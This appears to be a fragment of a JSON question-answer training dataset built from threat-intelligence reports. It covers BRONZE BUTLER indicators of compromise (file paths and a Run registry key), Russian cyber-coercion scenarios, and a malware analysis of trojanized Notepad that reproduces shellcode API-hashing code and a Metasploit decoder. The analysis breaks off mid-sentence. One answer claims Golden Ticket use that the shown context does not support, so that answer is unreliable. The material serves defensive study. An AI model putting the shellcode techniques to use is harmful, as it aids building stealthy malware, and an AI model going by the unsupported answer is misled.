Directory\u306f\u3001\u6a19\u7684\u578b\u653b\u6483\u304c\u884c\u308f\u308c\u308b\u969b\u306b\u5fc5\u305a\u653b\u6483\u5bfe\u8c61\u3068\u3057\u3066\u72d9\u308f\u308c\u308b\u91cd\u8981\u306a\u30b7\u30b9\u30c6\u30e0\u3068\u306a\u308a\u307e\u3059\u3002 BRONZE BUTLER\u3082\u76ee\u7684\u3067\u3042\u308b\u91cd\u8981\u60c5\u5831\u306e\u7a83\u53d6\u3092\u9054\u6210\u3059\u308b\u305f\u3081\u306b\u30d5\u30a1\u30a4\u30eb\u30b5\u30fc\u30d0\u306a\u3069\u3078\u306e\u30a2\u30af\u30bb\u30b9\u3092\u884c\u3046\u969b\u3001\u30c9\u30e1\u30a4\u30f3\u7ba1\u7406\u8005\u30a2\u30ab\u30a6\u30f3\u30c8\u3084\u8a8d\u8a3c\u30b5\u30fc\u30d0\u306e\u60c5\u5831\u3092\u60aa\u7528\u3057\u307e\u3059\u3002\u5f93\u3063\u3066\u3001Active Directory\u306e\u5805\u7262\u5316\u304a\u3088\u3073\u904b\u7528\u5f37\u5316\u306f\u6700\u3082\u91cd\u8981\u306a\u5bfe\u7b56\u306e\u4e00\u3064\u3068\u3044\u3048\u307e\u3059\u3002\n2017\u5e74 3\u6708 14\u65e5\u306b JPCERT\u30b3\u30fc\u30c7\u30a3\u30cd\u30fc\u30b7\u30e7\u30f3\u30bb\u30f3\u30bf\u30fc\u304c Active Directory\u3092\u72d9\u3046\u9ad8\u5ea6\u306a\u30b5\u30a4\u30d0\u30fc\u653b\u6483\u306e\u65e9\u671f\u691c\u77e5\u3068\u88ab\u5bb3\u8efd\u6e1b\u306e\u305f\u3081\u306b\u89e3\u8aac\u66f8\u300c\u30ed\u30b0\u3092\u6d3b\u7528\u3057\u305f Active Directory\u306b\u5bfe\u3059\u308b\u653b\u6483\u306e\u691c\u77e5\u3068\u5bfe\u7b56\u300d\u3092\u516c\u958b\u3057\u307e\u3057\u305f\u3002\n\u30ed\u30b0\u3092\u6d3b\u7528\u3057\u305f Active Directory\u306b\u5bfe\u3059\u308b\u653b\u6483\u306e\u691c\u77e5\u3068\u5bfe\u7b56\n\u5f53\u89e3\u8aac\u66f8\u306b\u306f\u3001\u4e88\u9632\u7b56\u304c\u4e0b\u8a18\u306e\u901a\u308a\u307e\u3068\u3081\u3089\u308c\u3066\u3044\u308b\u3060\u3051\u3067\u306a\u304f\u3001\u8a73\u7d30\u306a\u5bfe\u7b56\u624b\u9806\u3082\u8a18\u8f09\u3055\u308c\u3066\u3044\u307e\u3059\u306e\u3067\u3001\u53c2\u8003\u306b\u3057\u3066\u5bfe\u7b56\u3092\u8b1b\u3058\u308b\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\n\u2022 \u7ba1\u7406\u5c02\u7528\u7aef\u672b\u306e\u8a2d\u7f6e\n\u2022 \u901a\u4fe1\u5148\u30bb\u30b0\u30e1\u30f3\u30c8\u306e\u5236\u9650\n\u2022 \u30a2\u30ab\u30a6\u30f3\u30c8\u4f7f\u7528\u3092\u540c\u3058\u30bb\u30b0\u30e1\u30f3\u30c8\u5185\u306b\u5236\u9650\n\u2022 \u4ed8\u4e0e\u3059\u308b\u7279\u6a29\u306e\u6700\u5c0f\u5316\n\u2022 \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u66f4\u65b0\u30d7\u30ed\u30b0\u30e9\u30e0\u9069\u7528\n\u2022 \u8a8d\u8a3c\u60c5\u5831\u306e\u4fdd\u8b77\n\u2022 \u9069\u5207\u306a\u30d1\u30b9\u30ef\u30fc\u30c9\u306e\u8a2d\u5b9a\n\u524d\u8ff0\u306e\u3068\u304a\u308a\u3001\u8fd1\u5e74\u3001SKYSEA Client View\u306e\u8106\u5f31\u6027\u3092\u7528\u3044\u305f\u653b\u6483\u3092\u8d77\u70b9\u3068\u3057\u305f\u4fb5\u5165\u304c\u884c\u308f\u308c\u3066\u3044\u308b\u305f\u3081\u3001SKYSEA\u3092\u5229\u7528\u3057\u3066\u3044\u308b\u5834\u5408\u306f\u3001\u5fc5\u305a\u6700\u65b0\u7248\u306b\u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u3059\u308b\u3053\u3068\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\n\u4e00\u90e8\u306e\u30e2\u30d0\u30a4\u30eb\u30c7\u30fc\u30bf\u901a\u4fe1\u30c7\u30d0\u30a4\u30b9\u3092\u4f7f\u7528\u3057\u3066\u3044\u308b\u74b0\u5883\u306b\u304a\u3044\u3066\u306f\u3001\u7aef\u672b\u306b\u30b0\u30ed\u30fc\u30d0\u30eb IP\u30a2\u30c9\u30ec\u30b9\u304c\u5272\u308a\u632f\u3089\u308c\u3066\u3044\u308b\u306b\u3082\u95a2\u308f\u3089\u305a\u3001\u5916\u90e8\u304b\u3089\u306e\u30a2\u30af\u30bb\u30b9\u306b\u5bfe\u3059\u308b\u57fa\u672c\u7684\u306a\u30a2\u30af\u30bb\u30b9\u5236\u5fa1(\u5165\u308a\u53e3\u5bfe\u7b56)\u304c\u5b9f\u88c5\u3055\u308c\u3066\u3044\u306a\u3044\u30b1\u30fc\u30b9\u304c\u6563\u898b\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u672c\u30ec\u30dd\u30fc\u30c8\u306b\u8a18\u8f09\u3057\u305f SKYSEA Client View\u306e\u8106\u5f31\u6027\u3092\u7528\u3044\u305f\u653b\u6483\u3060\u3051\u3067\u306a\u304f\u3001RDP\u3001\u30d5\u30a1\u30a4\u30eb\u5171\u6709\u306a\u3069\u3068\u3044\u3063\u305f\u57fa\u672c\u7684\u306a\u30d7\u30ed\u30c8\u30b3\u30eb\u3092\u7528\u3044\u305f\u653b\u6483\u3092\u53d7\u3051\u308b\u5371\u967a\u6027\u304c\u3042\u308b\u305f\u3081\u3001Windows Firewall\u3068\u3044\u3063\u305f\u30d1\u30fc\u30bd\u30ca\u30eb\u30d5\u30a1\u30a4\u30a2\u30a6\u30a9\u30fc\u30eb\u306a\u3069\u3092\u6d3b\u7528\u3057\u3066\u30e2\u30d0\u30a4\u30eb\u7528\u7aef\u672b\u306e\u30a2\u30af\u30bb\u30b9\u5236\u5fa1\u306e\u691c\u8a0e\u3092\u63a8\u5968\u3057\u307e\u3059\u3002\u3042\u308b\u3044\u306f\u3001\u7aef\u672b\u306b\u76f4\u63a5\u30b0\u30ed\u30fc\u30d0\u30eb IP\u30a2\u30c9\u30ec\u30b9\u304c\u4ed8\u4e0e\u3055\u308c\u308b\u4e8b\u614b\u3092\u9632\u3050\u305f\u3081\u3001NAPT\u6a5f\u80fd\u3092\u6301\u3064\u30e2\u30d0\u30a4\u30eb\u30eb\u30fc\u30bf\u306a\u3069\u3092\u4f7f\u7528\u3059\u308b\u3053\u3068\u3082\u52b9\u679c\u7684\u3067\u3059\u3002\nBig Headline: Appendix A: \u653b\u6483\u6d3b\u52d5\u691c\u77e5\u306b\u6709\u52b9\u306a\u60c5\u5831\nBRONZE BUTLER\u306e\u653b\u6483\u6d3b\u52d5\u306f\u6c17\u4ed8\u304d\u3065\u3089\u304f\u3001\u653b\u6483\u3055\u308c\u3066\u304b\u3089\u6570\u5e74\u5f8c\u306b\u3001\u8b66\u5bdf\u5e81\u3084\u4e00\u822c\u793e\u56e3\u6cd5\u4eba JPCERT\u30b3\u30fc\u30c7\u30a3\u30cd\u30fc\u30b7\u30e7\u30f3\u30bb\u30f3\u30bf\u30fc\u304b\u3089\u306e\u60c5\u5831\u63d0\u4f9b\u306b\u3088\u3063\u3066\u6c17\u4ed8\u304f\u30b1\u30fc\u30b9\u304c\u591a\u3044\u3067\u3059\u3002\u3053\u3053\u3067\u306f\u3001\u81ea\u7d44\u7e54\u306e\u529b\u3067\u653b\u6483\u6d3b\u52d5\u3092\u691c\u77e5\u3059\u308b\u305f\u3081\u306e\u60c5\u5831\u3092\u63b2\u8f09\u3057\u307e\u3059\u3002\u30ed\u30b0\u3084\u5404\u7aef\u672b\u306e\u60c5\u5831\u306a\u3069\u3001\u7c21\u6613\u306a\u8abf\u67fb\u306b\u304a\u5f79\u7acb\u3066\u304f\u3060\u3055\u3044\u3002\nBRONZE BUTLER\u304c\u4f7f\u7528\u3059\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u306e HTTP\u901a\u4fe1\u306b\u306f\u3001URL\u3084\u30e6\u30fc\u30b6\u30a8\u30fc\u30b8\u30a7\u30f3\u30c8\u306b\u4ee5\u4e0b\u306e\u7279\u5fb4\u304c\u3042\u308b\u305f\u3081\u3001\u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u306a\u3069\u304b\u3089\u5404\u7a2e\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u611f\u67d3\u6709\u7121\u3092\u3042\u308b\u7a0b\u5ea6\u5224\u65ad\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u306a\u304a\u3001SecureWorks\u304c\u78ba\u8a8d\u3057\u3066\u3044\u308b\u5404\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u30c7\u30d5\u30a9\u30eb\u30c8\u8a2d\u5b9a\u60c5\u5831\u306b\u3064\u3044\u3066\u306f Appendix\u3092\u53c2\u7167\u304f\u3060\u3055\u3044\u3002\nBRONZE BUTLER\u304c\u4f7f\u7528\u3059\u308b\u30de\u30eb\u30a6\u30a7\u30a2\u306e HTTP\u901a\u4fe1\u306b\u306f\u3001URL\u3084\u30e6\u30fc\u30b6\u30a8\u30fc\u30b8\u30a7\u30f3\u30c8\u306b\u4ee5\u4e0b\u306e\u7279\u5fb4\u304c\u3042\u308b\u305f\u3081\u3001\u30d7\u30ed\u30ad\u30b7\u30ed\u30b0\u306a\u3069\u304b\u3089\u5404\u7a2e\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u611f\u67d3\u6709\u7121\u3092\u3042\u308b\u7a0b\u5ea6\u5224\u65ad\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002\u306a\u304a\u3001SecureWorks\u304c\u78ba\u8a8d\u3057\u3066\u3044\u308b\u5404\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u30c7\u30d5\u30a9\u30eb\u30c8\u8a2d\u5b9a\u60c5\u5831\u306b\u3064\u3044\u3066\u306f Appendix\u3092\u53c2\u7167\u304f\u3060\u3055\u3044\u3002\nBRONZE BUTLER\u304c\u4f7f\u7528\u3057\u305f\u30de\u30eb\u30a6\u30a7\u30a2\u3084\u30c4\u30fc\u30eb\u306f\u3001\u4ee5\u4e0b\u306e\u30d1\u30b9\u306b\u4fdd\u5b58\u3055\u308c\u3066\u3044\u307e\u3057\u305f\u3002\u30d5\u30a1\u30a4\u30eb\u540d\u306f\u88ab\u5bb3\u7d44\u7e54\u3054\u3068\u306b\u5909\u66f4\u3055\u308c\u308b\u50be\u5411\u304c\u3042\u308b\u305f\u3081\u3001\u78ba\u8a8d\u3059\u308b\u969b\u306b\u306f\u4ee5\u4e0b\u306e\u30d5\u30a1\u30a4\u30eb\u3060\u3051\u3067\u306a\u304f\u3001\u540c\u4e00\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u5b58\u5728\u3059\u308b\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb\u3084 dat\u30d5\u30a1\u30a4\u30eb(\u4e2d\u8eab\u306f\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb)\u306e\u5b58\u5728\u3082\u78ba\u8a8d\u3059\u308b\u3053\u3068\u304c\u671b\u307e\u3057\u3044\u3067\u3059\u3002\n\u2022 C:\\Intel\\IntelUpdata.exe\n\u2022 C:\\Intel\\Logs\\hlog.exe\n\u2022 C:\\Intel\\Logs\\IntelLogSrv.exe\n\u2022 C:\\Intel\\ExtremeGraphics\\CUI\\a.dat\n\u2022 C:\\PerfLogs\\Admin\\PerfLogs.exe\n\u2022 C:\\Program Files\\Adobe\\Reader 11.0\\Reader\\adobe.exe\n\u2022 C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\Readersl.exe\n\u2022 C:\\Program Files\\Common Files\\Java\\Java Update\\jusctray.exe\n\u2022 C:\\Program Files\\Common Files\\Justsystem\\JustOnlineUpdate\\JustsystemUpdate.exe\n\u2022 C:\\Program Files\\Common Files\\Microsoft Shared\\TRANSLAT\\MSBlESAD.VBE\n\u2022 C:\\Program Files\\CONEXANT\\SAII\\urllog.vbe\n\u2022 C:\\Program Files\\Internet Explorer\\jsExport.exe\n\u2022 C:\\Program Files\\Internet Explorer\\ieupset.exe\n\u2022 C:\\Program Files\\NVIDIA Corporation\\nview\\nvwrsc.exe\n\u2022 C:\\Program Files\\Windows NT\\logonslmon.exe\n\u2022 C:\\Program Files\\Windows NT\\usermd.exe\n\u2022 C:\\Windows\\system32\\AdoRdUPD.exe\n\u2022 C:\\Windows\\system32\\hwcomp.exe\n\u2022 C:\\Windows\\system32\\javamon.exe\n\u2022 C:\\Windows\\system32\\precui.exe\n\u2022 C:\\Windows\\system32\\reader.exe\n\u2022 C:\\Windows\\system32\\UACExec.exe\n\u2022 %TEMP%\\MMoevde.exe\n\u2022 %TEMP%\\ms<8\u6841\u306e 16\u9032\u6587\u5b57\u5217>.exe\n\u2022 %TEMP%\\msensi\\\n\u2022 %TEMP%\\plug\\AvUpdate.exe\n\u2022 <\u30b9\u30bf\u30fc\u30c8\u30a2\u30c3\u30d7\u30d5\u30a9\u30eb\u30c0>\\msdtci.exe\n\u307e\u305f\u3001\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u306b\u3066\u6a2a\u65ad\u7684\u4fb5\u5bb3\u3092\u884c\u3046\u969b\u306b\u4f7f\u7528\u3059\u308b\u30d0\u30c3\u30c1\u30d5\u30a1\u30a4\u30eb\u304c C:\\Windows\\system32\\\u306b\u5b58\u5728\u3059\u308b\u5834\u5408\u304c\u3042\u308a\u307e\u3059\u3002\u901a\u5e38\u4f7f\u7528\u3057\u3066\u3044\u306a\u3044\u30d0\u30c3\u30c1\u30d5\u30a1\u30a4\u30eb\u306e\u5b58\u5728\u6709\u7121\u3092\u8abf\u3079\u308b\u3053\u3068\u3067\u3001\u4fb5\u5bb3\u3055\u308c\u3066\u3044\u308b\u304b\u3069\u3046\u304b\u78ba\u8a8d\u53ef\u80fd\u3067\u3059\u3002\nSKYSEA Client View\u306e\u8106\u5f31\u6027\u3092\u60aa\u7528\u3055\u308c\u30de\u30eb\u30a6\u30a7\u30a2\u306b\u611f\u67d3\u3057\u305f\u5834\u5408\u306b\u306f\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306a 00000001.BIN(BRONZE BUTLER\u304c\u9001\u308a\u8fbc\u3093\u3060\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0)\u5b9f\u884c\u8a18\u9332\u304c SKYSEA\u306e\u30ed\u30b0(CtlCli.log)\u306b\u8a18\u9332\u3055\u308c\u307e\u3059\u3002\n\u307e\u305f\u3001Sysmon\u304c\u5c0e\u5165\u3055\u308c\u3066\u3044\u308b\u5834\u5408\u3001\u30a4\u30d9\u30f3\u30c8\u30ed\u30b0\u306b\u30d5\u30a1\u30a4\u30eb\u306e\u5b9f\u884c\u5c65\u6b74\u304c\u8a18\u9332\u3055\u308c\u3066\u3044\u308b\u305f\u3081\u3001\u653b\u6483\u8005\u306e\u95a2\u9023\u30d5\u30a1\u30a4\u30eb\u306e\u5b9f\u884c\u5c65\u6b74\u306e\u6709\u7121\u3092\u78ba\u8a8d\u3059\u308b\u3053\u3068\u304c\u53ef\u80fd\u3067\u3059\u3002\nBRONZE BUTLER\u306f\u6a2a\u65ad\u7684\u4fb5\u5bb3\u306b\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u3092\u4f7f\u7528\u3057\u307e\u3059\u304c\u3001\u305d\u306e\u30b9\u30b1\u30b8\u30e5\u30fc\u30eb\u30bf\u30b9\u30af\u306b\u306f\u4ee5\u4e0b\u306e\u7279\u5fb4\u304c\u3042\u308a\u307e\u3059\u3002\u4ee5\u4e0b\u306e\u7279\u5fb4\u3092\u6301\u3064\u30bf\u30b9\u30af\u304c\u767b\u9332\u3055\u308c\u3066\u3044\u306a\u3044\u304b\u3092\u3054\u78ba\u8a8d\u304f\u3060\u3055\u3044\u3002\n\u2022 \u540d\u524d\u304c\u4ed8\u3051\u3089\u308c\u3066\u304a\u3089\u305a\u3001At<\u6570\u5024>.job\u3067\u767b\u9332\u3055\u308c\u3066\u3044\u308b\n\u2022 \u7279\u5b9a\u306e\u6642\u9593\u306b\u4e00\u5ea6\u3060\u3051\u5b9f\u884c\u3059\u308b\u3088\u3046\u306b\u306a\u3063\u3066\u3044\u308b\n\u2022 C:\\Windows\\system32\\\u4ee5\u4e0b\u306e\u610f\u56f3\u3057\u306a\u3044\u30d0\u30c3\u30c1\u30d5\u30a1\u30a4\u30eb(.bat)\u3084\u5b9f\u884c\u30d5\u30a1\u30a4\u30eb(.exe)\u3092\u5b9f\u884c\u3059\u308b\n\u4ee5\u4e0b\u306e\u30ec\u30b8\u30b9\u30c8\u30ea\u30a8\u30f3\u30c8\u30ea\u304c\u5b58\u5728\u3057\u305f\u5834\u5408\u3001Daserf(\u6539\u826f\u7248)\u306b\u611f\u67d3\u3057\u3066\u3044\u308b/\u611f\u67d3\u3057\u3066\u3044\u305f\u3053\u3068\u3092\u793a\u3057\u307e\u3059\u3002\n\u307e\u305f\u3001BRONZE BUTLER\u306f\u6f5c\u4f0f\u306e\u305f\u3081\u3001\u30c0\u30a6\u30f3\u30ed\u30fc\u30c0\u3092\u81ea\u52d5\u5b9f\u884c\u3059\u308b\u305f\u3081\u306e\u30ec\u30b8\u30b9\u30c8\u30ea\u30a8\u30f3\u30c8\u30ea\u3092\u4f5c\u6210\u3059\u308b\u5834\u5408\u304c\u3042\u308a\u307e\u3059\u3002\u4ee5\u4e0b\u306e\u30ec\u30b8\u30b9\u30c8\u30ea\u30a8\u30f3\u30c8\u30ea\u306b\u3001\u610f\u56f3\u3057\u306a\u3044 VBE\u30b9\u30af\u30ea\u30d7\u30c8\u304c\u767b\u9332\u3055\u308c\u3066\u3044\u306a\u3044\u304b\u78ba\u8a8d\u3059\u308b\u3053\u3068\u3092\u304a\u52e7\u3081\u3057\u307e\u3059\u3002\n\u30ad\u30fc\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nAnswer this question based on the above context: What strategies does BRONZE BUTLER employ to ensure persistence and escalate privileges within a compromised network? How can organizations mitigate these strategies?",
    "output": "BRONZE BUTLER employs several strategies to ensure persistence and escalate privileges. One key technique is the creation of Golden Tickets using Mimikatz, which allows attackers to maintain administrative access without needing user authentication. These Golden Tickets are created using the KRBTGT account's credentials and can be used to impersonate any user. To mitigate this, organizations should reset the KRBTGT account password twice consecutively. Additionally, BRONZE BUTLER uses scheduled tasks and registry modifications to ensure that malware is executed upon user login. Organizations can counteract these methods by regularly reviewing scheduled tasks and registry entries for unauthorized changes. Implementing strict access controls and monitoring for unusual activity, such as the creation of new scheduled tasks or registry modifications, can help detect and prevent privilege escalation attempts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 5 Coercion: Escalate to De-escalate\nThe most aggressive option for Putin is to use cyber capabilities to disrupt the economies of the West. Imagine a massive, long-term and continuing attack against the West's financial system or power grids. What if, Sony-style, one bank a week were to be targeted for a disruptive and embarrassing attack?\nWhat if, Sony-style, one bank a week were targeted for a disruptive and embarrassing attack?\nRussia in the past had, along with at least the United States and China, the capability to conduct such attacks, but lacked the intent. Russia had disagreements with the West but was not engaged in any real conflict. Further, to some extent, Russia needed healthy Western economies to itself thrive.\nThat situation has changed. Today, Putin may well see himself in a conflict with the West, perhaps even a shooting war, and feel the very survival of his regime could be at stake. In 2013, sanctions including asset freezes and export prohibitions pushed Russia to the brink of a recession, and the economy grew by only 1.3%.12 By the end of 2015, the World Bank predicts that ongoing sanctions coupled with the decrease in oil prices will shrink the Russian economy by 3.8%.13 Putin could calculate that Russia has few remaining stakes in the global economy and financial system.\nWithout international economic entanglement, it is far easier for Putin to use Russia's impressive cyber capabilities to try to directly coerce (rather than threaten) the West. By inflicting economic turmoil, he could turn Russia's lack of a stake in the global financial system from a liability into an asset. With nothing to lose and everything to gain, Putin might calculate that unleashing his just-deniable-enough 'little green bytes' against Western economies could be a win-win situation for Russia.\nRussia is already pushing the idea that they may need to 'escalate to de-escalate' a brewing conflict with the West. In an extensive article in Vox, Max Fisher lays out the evidence that the world is ever closer to conflict, even a world war, and especially that Putin 'has enshrined, in Russia's official nuclear doctrine, a dangerous idea no Soviet leader ever adopted: that a nuclear war could be winnable'. 14\n12 'How far do EU-US sanctions on Russia go?' BBC, September 15, 2014, (<http://www.bbc.com/news/world-europe-28400218>)http://www.bbc.com/news/world-europe-28400218\n13 Andrey Ostroukh. 'Russia's Economic Outlook Worse Than Thought, World Bank Says,' The Wall Street Journal, April 1, 2015, (<http://www.wsj.com/articles/russias-economic-outlook-worse-than-thought-world-bank-says-1427883522>)http://www.wsj.com/articles/russias-economic-outlook-worse-than-thought-world-bank-says-1427883522.\n14 Max Fisher. 'How World War III Became Possible,' Vox, June 29, 2015, http://www.vox.com/2015/6/29/8845913/russia-war.\nIn that light, cyber weapons may offer an even more attractive opportunity given that cyber effects can be temporary and reversible. Russian Deputy Prime Minister Dmitry Rogozin has already declared that Russian tanks 'don't need visas' to cross international borders.15 If Russia is willing to make nuclear threats and roll T-72s across borders, then how much more likely are attacks using faster, more deniable, electrons?\nOne obvious target would be Western financial firms that currently enforce the sanctions against Russia. Many analysts believe that Iran chose precisely this form of retaliation in 2012, in response to Stuxnet.16 Other obvious targets could be the oil, gas, or electricity sectors, in order to raise the price of oil.\nDuring our research for this chapter, several security analysts stated that Russia may be preparing for this contingency with its Havex and BlackEnergy cyber campaigns.17 In both cases, Russian government hackers apparently targeted Western energy companies, not for espionage, but in order to prepare for a potential follow-on disruptive attack. It appears Russia has proved that it has the required capabilities already in place to disrupt Western energy systems, now it is just a matter of having the intent.\nOr Putin could focus his cyber attack not against sectors, but against specific Western allies; those he felt would be most likely to submit to coercive pressure. His whispered promise might be something along the lines of 'Drop your support for sanctions and all these cyber failures you're experiencing can just go away.' Countries which might not have been fully committed to the sanctions in the first place might not need much convincing.\nSmall Headline: 6 Conclusion\nCyberspace \u2013 and cyber attacks \u2013 offer many ways, especially for a capable nation-state, to target an adversary. In the current conflict, the most likely near-term options for Russia are perhaps local instability, intimidation and coercion. Of course, the scenarios discussed in this chapter are not mutually exclusive; Putin could jump between them or even employ them all simultaneously.\nFortunately to help analyse Russia's cyber current actions, it may be enough to analyse his actions in the physical world: Russian hostility in Europe is likely to be matched with Russian hostility online. If this process starts to get out of control, then Western leaders have to be at their highest level of concern.\nIf Putin believes he is approaching a use-it-or-lose-it situation for his autocratic regime and its stolen billions, he may just decide to take the internet down with him.\n15 'Russian Official: 'Tanks Don't Need Visas', Defense One/Agence France-Presse, May 25, 2015, (<http://www.defensenews.com/story/defense/international/europe/2015/05/25/russian-official-tanks-need-visas/27924351/>)http://www.defensenews.com/ (<http://www.defensenews.com/story/defense/international/europe/2015/05/25/russian-official-tanks-need-visas/27924351/>)story/defense/international/europe/2015/05/25/russian-official-tanks-need-visas/27924351/.\n16 Siobhan Gorman and Julian Barnes. 'Iran Blamed for Cyberattacks,' The Wall Street Journal, October 12, 2012, (<http://www.wsj.com/articles/SB10000872396390444657804578052931555576700>)http://www.wsj. (<http://www.wsj.com/articles/SB10000872396390444657804578052931555576700>)com/articles/SB10000872396390444657804578052931555576700.\n17 Blake Sobczak and Peter Behr. 'Secret meetings tackle back-to-back energy-sector cyberthreats,' EnergyWire, October 31, 2014, (<http://www.eenews.net/energywire/stories/1060008193>)http://www.eenews.net/energywire/stories/1060008193.\nSmall Headline: 1 Introduction\nThe digitisation of information, which began during the Second World War, has significantly deepened the relationship between human beings (from the individual to the nation-state) and unstructured data, structured information (such as a databases), and intelligence (information of political or military value). Every part of society has benefited from information technology; however, as we have increasingly become data-reliant, our adversaries have sought to leverage information against us. Attackers and defenders now battle for access to, and control of, information in the political, economic, military, and social spheres. In military parlance, data has become a virtual 'high ground' from which the better-informed can influence an adversary.\nThe Ukrainian Government currently finds itself at a tactical disadvantage vis-\u00e0-vis Russia, both on the traditional field of battle as well as in cyberspace. However, cyber security, especially at the national level, is a strategic game, and Kyiv can make smart investments that will pay off over the long run. In Ukraine, as in every other nation-state, practitioners, academics, policy-makers, and the public are individually and collectively vexed by the question of how to defend data, information, and intelligence. Part of the problem is that adversaries do not have one or even several attack strategies at their disposal: they can steal, destroy, deny access to, or even alter information \u2013 as well as the systems that store, process, and display it to its ostensible owners.\nDigitised information is a human product which resides in mechanical devices built by engineers and programmers, and so decision-makers naturally turn to the technical community for answers to these challenges. Technical proposals take many forms. Several frequently appear in policy-making circles: we could scrap the internet entirely and replace it with a 'more secure' alternative;1 we might build software that is 'not hackable,' possibly through 'leap ahead' technologies that make defence easier than offense (which is today manifestly not the case);2 or we can outsource our security to third-party vendors.3 These are all technical ideas, but they are generally not feasible for a variety of reasons. More fundamentally, it is dangerous to rely solely on technology to mitigate core security problems.\nQ: What role do the Havex and BlackEnergy cyber campaigns play in Russia's potential preparations for cyber warfare, and what capabilities have these campaigns demonstrated?",
    "output": "The Havex and BlackEnergy cyber campaigns are believed to be part of Russia's preparations for potential cyber warfare. These campaigns have targeted Western energy companies, not for espionage, but to prepare for potential disruptive attacks. The successful infiltration of these systems demonstrates that Russia has the necessary capabilities in place to disrupt Western energy systems. This readiness indicates that Russia is poised to act if it decides to escalate tensions using cyber means.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Tales from the Code\nLet's take a look at the entry point code of the malicious Notepads and see if it aligns with our observations. The short answer is, it looks like nonsense. Here's a snippet from Notepad4.exe:\nAt this point the code becomes difficult to list due to instruction scission, or branching into the middle of an instruction (analogous to a frameshift error in DNA translation, if that helps). For instance, the JNP instruction at 010067FF is a two-byte instruction, and the JNZ branch at 010067F9, if satisfied, jumps to the JNP instruction's second byte at 01006800. That byte begins a different two-byte instruction, which incorporates what would have otherwise been the first byte of the instruction after the JNP, meaning its successor will start in the middle of JNP's successor, and so on. The two execution paths usually (but don't\nnecessarily) converge after a few instructions.\nThe outcome of these instructions depends on the initial state of the registers, which is technically undefined. Seeing code operate on undefined values typically suggests that the bytes aren't code after all and so shouldn't have been disassembled. But keep looking. Notice that there are no memory accesses (which could raise an access violation), no stack pointer manipulation (which could cause a stack overflow or underflow), no division instructions (which could raise a divide exception), no invalid or privileged instructions, no interrupts or indirect branches--really, no uncontrolled execution transfers of any kind. Even more tellingly, all the possible execution paths seem to eventually flow to this code:\nHere the gaps in the listing indicate when the disassembly follows an unconditional branch. The code seems to abruptly change character after the jump at 01006891, transitioning from gibberish to a string of short sequences connected by unconditional branches. This transition corresponds to a jump from the end of the short run of modifications (01006896) after the malware entry point to the beginning of the longer run of modifications (01005747) a few kilobytes before it. (See the third column in Figure 3.)\nIn the disassembly above, the first sequence of green lines is a clear CALL-POP pair intended to obtain a code address in a position-independent way. (An immediate address value marked with a relocation would be the orthodox way to obtain a code pointer, but preparing that would have involved modifying the \".reloc\" section.) No way is this construct a coincidence. Furthermore, the blue lines strongly resemble the setup for a VirtualAlloc call (VirtualAlloc(NULL, 0x1A9, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) typical of a deobfuscation stub, and the second set of green lines invoke the CALL-POPped function pointer with what one might readily assume is a hash of the string \"VirtualAlloc\". (It is.)\nThere's plenty more to observe in the disassembly, but, let's fast-forward past it.\nwindbg -c \"bp kernel32!VirtualAlloc ; g\" Notepad4.exe...\ng poi(@esp) ; ba w 1 @eax+@esi-1 ; g...\nAnd now we can dump the extracted code from memory. It isn't immediately gratifying:\nThe byte 0xD6 at address 00100019 doesn't disassemble, and there aren't any branches skipping over it. But check out the instructions just above it referencing \"[eax+19]\". The code is in a sense self-modifying, flowing right into a portion of itself that it XOR decodes. The first decoded instruction is \"LOOP 00100010\" (0xD6 ^ 0x34 = 0xE2, the opcode for LOOP), which will execute the XOR loop body 99 more times (CL - 1 = 0x63 = 99) and then fall through to the newly-decoded code.\nWhen we run this decoding stub (which, come to find out, is Metasploit's \"shikata ga nai\" decoder stub) to\nHere, the first byte to be XORed is the second byte of the LOOP instruction, hence the nonsensical destination apparent in the pre-decoding disassembly above. (For brevity, we cut each listing at the first sign of encoding.) Run that to completion, and then...\n>InMemoryOrderModuleList\n; PLDR_MODULE.BaseDllName.Buffer\nIt looks like a call over a typical module or export lookup function. In fact, it is, and as the ROR-ADD pair suggests, it implements module name and export name hashing, the algorithms of which can be expressed\nas follows:\nunsigned int GetModuleNameHash(PLDR_MODULE pLdrModule)\n{\nunsigned int hash = 0;\nchar * p = (char *) pLdrModule->BaseDllName->Buffer;\nfor (int n = pLdrModule->BaseDllName->MaximumLength; n != 0; p++, n--)\n{\nchar ch = *p;\nif (ch >= 'a') ch -= 0x20;\nhash = _rotr(hash, 13) + (unsigned char) ch;\n}\nreturn hash;\n}\nunsigned int GetExportNameHash(char *pszName)\n{\nunsigned int hash = 0;\nfor ( ; ; pszName++)\n{\nhash = _rotr(hash, 13) + (unsigned char) *pszName;\nif (*pszName == 0) break;\n}\nreturn hash;\n}\nStill, this is all just preamble. What is the point that it eventually gets to?\nYou'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means there's some treasure beyond all fables at the bottom of this erstwhile Notepad. Sorry. It just downloads and executes a block of raw code. (Spoiler: it's actually a Metasploit reverse connect stager.) Here is its behavior summarized as function 